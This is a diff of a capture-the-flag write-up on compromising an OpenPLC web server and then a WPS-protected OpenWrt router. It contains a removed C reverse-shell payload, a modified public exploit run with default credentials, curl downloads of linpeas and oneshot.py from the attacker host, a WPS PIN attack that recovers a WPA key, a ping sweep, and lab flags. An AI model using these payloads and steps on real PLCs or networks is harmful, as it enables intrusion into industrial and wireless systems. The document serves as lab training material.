@@ -148,7 +148,7 @@ $ rlwrap nc -lnvp 9001
 listening on [any] 9001 ...
 ```
 
-`$ python3 49803.py -u http://10.10.11.7:8080 -l openplc -p openplc -i 10.10.14.24 -r 9001`
+`$ python3 49803.py -u http://10.10.11.7:8080 -l openplc -p openplc -i 10.10.14.100 -r 9001`
 ```bash
 [+] Remote Code Execution on OpenPLC_v3 WebServer
 [+] Checking if host http://10.10.11.7:8080 is Up...
@@ -158,117 +158,268 @@ listening on [any] 9001 ...
 [+] PLC program uploading... 
 [+] Attempt to Code injection...
 [+] Spawning Reverse Shell...
-[+] Failed to receive connection :(
-                                              
+[+] Failed to receive connection :(       
 ```
-
-I don't get any shell from that exploit script. but seems like we can input any malicious code in this application menu http://10.10.11.7:8080/hardware
 
 # Exploitation
-Generate the reverse shell with https://www.revshells.com/, and it manually to http://10.10.11.7:8080/hardware then become like below.
-```C
-//-----------------------------------------------------------------------------
-// DISCLAIMER: EDDITING THIS FILE CAN BREAK YOUR OPENPLC RUNTIME! IF YOU DON'T
-// KNOW WHAT YOU'RE DOING, JUST DON'T DO IT. EDIT AT YOUR OWN RISK.
-//
-// PS: You can always restore original functionality if you broke something
-// in here by clicking on the "Restore Original Code" button above.
-//-----------------------------------------------------------------------------
-
-//-----------------------------------------------------------------------------
-// These are the ignored I/O vectors. If you want to override how OpenPLC
-// handles a particular input or output, you must put them in the ignored
-// vectors. For example, if you want to override %IX0.5, %IX0.6 and %IW3
-// your vectors must be:
-//     int ignored_bool_inputs[] = {5, 6}; //%IX0.5 and %IX0.6 ignored
-//     int ignored_int_inputs[] = {3}; //%IW3 ignored
-//
-// Every I/O on the ignored vectors will be skipped by OpenPLC hardware layer
-//-----------------------------------------------------------------------------
-#include <stdio.h>
-#include <sys/socket.h>
-#include <sys/types.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-
-int ignored_bool_inputs[] = {-1};
-int ignored_bool_outputs[] = {-1};
-int ignored_int_inputs[] = {-1};
-int ignored_int_outputs[] = {-1};
-
-//-----------------------------------------------------------------------------
-// This function is called by the main OpenPLC routine when it is initializing.
-// Hardware initialization procedures for your custom layer should be here.
-//-----------------------------------------------------------------------------
-void initCustomLayer()
-{
-}
-
-//-----------------------------------------------------------------------------
-// This function is called by OpenPLC in a loop. Here the internal input
-// buffers must be updated with the values you want. Make sure to use the mutex 
-// bufferLock to protect access to the buffers on a threaded environment.
-//-----------------------------------------------------------------------------
-void updateCustomIn()
-{
-    // Example Code - Overwritting %IW3 with a fixed value
-    // If you want to have %IW3 constantly reading a fixed value (for example, 53)
-    // you must add %IW3 to the ignored vectors above, and then just insert this 
-    // single line of code in this function:
-    //     if (int_input[3] != NULL) *int_input[3] = 53;
-}
-
-//-----------------------------------------------------------------------------
-// This function is called by OpenPLC in a loop. Here the internal output
-// buffers must be updated with the values you want. Make sure to use the mutex 
-// bufferLock to protect access to the buffers on a threaded environment.
-//-----------------------------------------------------------------------------
-void updateCustomOut()
-{
-    // Example Code - Sending %QW5 value over I2C
-    // If you want to have %QW5 output to be sent over I2C instead of the
-    // traditional output for your board, all you have to do is, first add
-    // %QW5 to the ignored vectors, and then define a send_over_i2c()
-    // function for your platform. Finally you can call send_over_i2c() to 
-    // send your %QW5 value, like this:
-    //     if (int_output[5] != NULL) send_over_i2c(*int_output[5]);
-    //
-    // Important observation: If your I2C pins are used by OpenPLC I/Os, you
-    // must also add those I/Os to the ignored vectors, otherwise OpenPLC
-    // will try to control your I2C pins and your I2C message won't work.
-    int port = 9001;
-    struct sockaddr_in revsockaddr;
-
-    int sockt = socket(AF_INET, SOCK_STREAM, 0);
-    revsockaddr.sin_family = AF_INET;       
-    revsockaddr.sin_port = htons(port);
-    revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.24");
-
-    connect(sockt, (struct sockaddr *) &revsockaddr, 
-    sizeof(revsockaddr));
-    dup2(sockt, 0);
-    dup2(sockt, 1);
-    dup2(sockt, 2);
-
-    char * const argv[] = {"powershell", NULL};
-    execvp("powershell", argv);
-
-    return 0;       
-}
+Try to enhance the exploit code, change the line below:
+```
+compile_program = options.url + '/compile-program?file=681871.st'
+```
+To be:
+```
+compile_program = options.url + '/compile-program?file=blank_program.st'
 ```
 
-Set Listeing port
+**Then run the exploit:**
+`$ python3 49803.py -u http://10.10.11.7:8080 -l openplc -p openplc -i 10.10.14.100 -r 9001`
+```bash
+[+] Remote Code Execution on OpenPLC_v3 WebServer
+[+] Checking if host http://10.10.11.7:8080 is Up...
+[+] Host Up! ...
+[+] Trying to authenticate with credentials openplc:openplc
+[+] Login success!
+[+] PLC program uploading... 
+[+] Attempt to Code injection...
+[+] Spawning Reverse Shell...
 ```
-$ rlwrap nc -lnvp 9001
+
+**The listening port:**
+```
 listening on [any] 9001 ...
-```
-Then run the PLC from it's dashboard.
+connect to [10.10.14.100] from (UNKNOWN) [10.10.11.7] 39558
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 
+root@attica03:/opt/PLC/OpenPLC_v3/webserver# cat /root/user.txt
+f667780882567fae111b2a4800a46596
 ```
-$ python3 -c 'import pty;pty.spawn("/bin/bash")'
-$ ^Z
-$ stty raw -echo;fg              
-$ export TERM=xterm
+
+# Post-Exploitation
+**Looking for something interesting**
+`root@attica03:/tmp# uname -a`
+```bash
+Linux attica03 5.4.0-174-generic #193-Ubuntu SMP Thu Mar 7 14:29:28 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+`root@attica03:/tmp# lscpu`
+```bash
+Architecture:            x86_64
+  CPU op-mode(s):        32-bit, 64-bit
+  Address sizes:         43 bits physical, 48 bits virtual
+  Byte Order:            Little Endian
+CPU(s):                  2
+  On-line CPU(s) list:   0,1
+Vendor ID:               AuthenticAMD
+  Model name:            AMD EPYC 7313P 16-Core Processor
+    CPU family:          25
+    Model:               1
+    Thread(s) per core:  1
+    Core(s) per socket:  1
+    Socket(s):           2
+    Stepping:            1
+    BogoMIPS:            5988.75
+    Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mc
+                         a cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx m
+                         mxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good 
+                         nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pcl
+                         mulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe p
+                         opcnt aes xsave avx f16c rdrand hypervisor lahf_lm exta
+                         pic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw
+                          invpcid_single ibpb vmmcall fsgsbase bmi1 avx2 smep bm
+                         i2 invpcid rdseed adx smap clflushopt clwb sha_ni xsave
+                         opt xsavec xsaves clzero arat pku ospke overflow_recov 
+                         succor
+Virtualization features: 
+  Hypervisor vendor:     VMware
+  Virtualization type:   full
+```
+
+## Enumeration
+**Listening port on local machine**
+`$ python3 -m http.server 80`
+```
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.7 - - [29/Mar/2024 14:08:49] "GET /linpeas.sh HTTP/1.1" 200 -
+```
+**Download linpeas.sh on target machine**
+`root@attica02:/tmp# curl http://10.10.14.100/linpeas.sh -o linpeas.sh`
+`root@attica02:/tmp# chmod +x linpeas.sh`
+`root@attica02:/tmp# ./linpeas.sh`
+```
+╔══════════╣ Interfaces
+# symbolic names for networks, see networks(5) for more information                                                                                                         
+link-local 169.254.0.0
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.3.3  netmask 255.255.255.0  broadcast 10.0.3.255
+        inet6 fe80::216:3eff:fefb:30c8  prefixlen 64  scopeid 0x20<link>
+        ether 00:16:3e:fb:30:c8  txqueuelen 1000  (Ethernet)
+        RX packets 1978  bytes 1014683 (1.0 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1176  bytes 396079 (396.0 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 25  bytes 1964 (1.9 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 25  bytes 1964 (1.9 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        ether 02:00:00:00:03:00  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+
+`root@attica02:/tmp# iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis`
+```
+BSS 02:00:00:00:01:00(on wlan0)
+        SSID: plcrouter
+                 * Authentication suites: PSK
+                 * SSID List
+        WPS:     * Version: 1.0
+```
+
+# Lateral Movement
+## Connect to the SSID `plcrouter`
+In the local machine
+`$ wget https://raw.githubusercontent.com/kimocoder/OneShot/master/oneshot.py`
+
+In the remote machine
+`root@attica02:/tmp# curl http://10.10.14.100/oneshot.py -o one.py`
+`root@attica02:/tmp# python3 one.py -i wlan0 -b 02:00:00:00:01:00 -K`
+```
+[*] Running wpa_supplicant…
+[*] Running wpa_supplicant…
+[*] Trying PIN '12345670'…
+[*] Scanning…
+[*] Authenticating…
+[+] Authenticated
+[*] Associating with AP…
+[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
+[*] Received Identity Request
+[*] Sending Identity Response…
+[*] Received WPS Message M1
+[P] E-Nonce: 9B1B93EB7BEE97212B3C2630BE39817A
+[*] Sending WPS Message M2…
+[P] PKR: 014238A5E2A656E6EBC43026E48F6C82E4F9726472A196DC07525BDE3AF487EA300F5CB15B5392974B46C725EE714797A2F84C8AF09762996132367975412DADAE8C07ED77FC4353283CD4C5E63C35A456C29310124A478F45C22987ADA29E7A77E8952DDE6F000EF7A417AA73F9B96EB578A75F8E6F6D9333B541FC012514DA86F46EEA1D27E7CF4917D62916BC9074E26D9C99FC5DEF56EA51D02321A8E4631ECAE62F226D3634523D6E37F4E86DC118264E2F3644DF14DCA6A4EBAACAC17E
+[P] PKE: 63ED7F4F065DADADA818F40915AD27D3ED541F3C83FE278449AB2DAE64CF386C4AD3A7F342E26A645960AD1DDBA1AC59FB30D26C2CA894868732E8BCE64DC22261B1FAF3D15402982F9A31D7BC10CCFB283486B5198AE456FB055744F9334793C863E3DAE2C09D88E2C42CC89FF77281865791C874154EB67AEBBF5123362E21AA988F52BC9CFCDFB18118DC2CFCF82237F8E0A9795482E200EAF9746917C6A5847AD0E90D9E6C43DED8793B4625283C14384CC4F1CE49398564B461DC6BC4D9
+[P] AuthKey: B3EC8AC7FFAD96B12E87BA00458AC5E97DE4B8C735B3382E54D6D78A7B2C41ED
+[*] Received WPS Message M3
+[P] E-Hash1: 0A34603B6E06CF1A487E652472FD8B14EBA5D749971934A71AC999ABE15FBF91
+[P] E-Hash2: 16ED7E4D4C157466C4438936EC6900453F5B43257CC17B7129C4EAEBAB2490E7
+[*] Sending WPS Message M4…
+[*] Received WPS Message M5
+[+] The first half of the PIN is valid
+[*] Sending WPS Message M6…
+[*] Received WPS Message M7
+[+] WPS PIN: '12345670'
+[+] WPA PSK: 'NoWWEDoKnowWhaTisReal123!'
+[+] AP SSID: 'plcrouter'
+```
+
+**Save the WPA Password**
+`root@attica01:/tmp# wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!' > config`
+`root@attica01:/tmp# wpa_supplicant -B -c config -i wlan0`
+```
+wpa_supplicant -B -c config -i wlan0
+Successfully initialized wpa_supplicant
+rfkill: Cannot open RFKILL control device
+rfkill: Cannot get wiphy information
+```
+
+`root@attica01:/tmp# ifconfig`
+```
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.3.2  netmask 255.255.255.0  broadcast 10.0.3.255
+        inet6 fe80::216:3eff:fefc:910c  prefixlen 64  scopeid 0x20<link>
+        ether 00:16:3e:fc:91:0c  txqueuelen 1000  (Ethernet)
+        RX packets 2392  bytes 292121 (292.1 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1540  bytes 565661 (565.6 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 135  bytes 8028 (8.0 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 135  bytes 8028 (8.0 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet6 fe80::ff:fe00:200  prefixlen 64  scopeid 0x20<link>
+        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
+        RX packets 7  bytes 1223 (1.2 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 16  bytes 2172 (2.1 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+
+Try to input IP Address in wlan0 manually
+`root@attica01:/tmp# ifconfig wlan0 192.168.1.7 netmask 255.255.255.0`
+```
+<r# ifconfig wlan0 192.168.1.7 netmask 255.255.255.0
+```
+
+Mapping the all existing Host on the network:
+`root@attica01:/tmp# for i in {1..255}; do IP="192.168.1.$i"; ping -c 1 -W 1 "$IP" &>/dev/null && echo "$IP is reachable" || echo "$IP is not reachable"; done`
+```
+192.168.1.1 is reachable
+192.168.1.2 is not reachable
+192.168.1.3 is not reachable
+192.168.1.4 is not reachable
+192.168.1.5 is not reachable
+192.168.1.6 is not reachable
+192.168.1.7 is reachable
+192.168.1.8 is not reachable
+192.168.1.9 is not reachable
+192.168.1.10 is not reachable
+192.168.1.11 is not reachable
+192.168.1.12 is not reachable
+192.168.1.13 is not reachable
+192.168.1.14 is not reachable
+192.168.1.15 is not reachable
+192.168.1.16 is not reachable
+192.168.1.17 is not reachable
+192.168.1.18 is not reachable
+192.168.1.19 is not reachable
+192.168.1.20 is not reachable
+```
+
+## Connect to `192.168.1.1` with `root` user.
+`root@attica02:/tmp# ssh root@192.168.1.1`
+```
+ssh root@192.168.1.1
+The authenticity of host '192.168.1.1 (192.168.1.1)' can't be established.
+ED25519 key fingerprint is SHA256:ZcoOrJ2dytSfHYNwN2vcg6OsZjATPopYMLPVYhczadM.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+yes
+Warning: Permanently added '192.168.1.1' (ED25519) to the list of known hosts.
+
+
+BusyBox v1.36.1 (2023-11-14 13:38:11 UTC) built-in shell (ash)
+
+  _______                     ________        __
+ |       |.-----.-----.-----.|  |  |  |.----.|  |_
+ |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+ |_______||   __|_____|__|__||________||__|  |____|
+          |__| W I R E L E S S   F R E E D O M
+ -----------------------------------------------------
+ OpenWrt 23.05.2, r23630-842932a63d
+ -----------------------------------------------------
+=== WARNING! =====================================
+There is no root password defined on this device!
+Use the "passwd" command to set up a new password
+in order to prevent unauthorized SSH logins.
+--------------------------------------------------
+root@ap:~# cat root.txt
+cat root.txt
+05c59afaee3e4cce02194ee3025e7d88
 ```
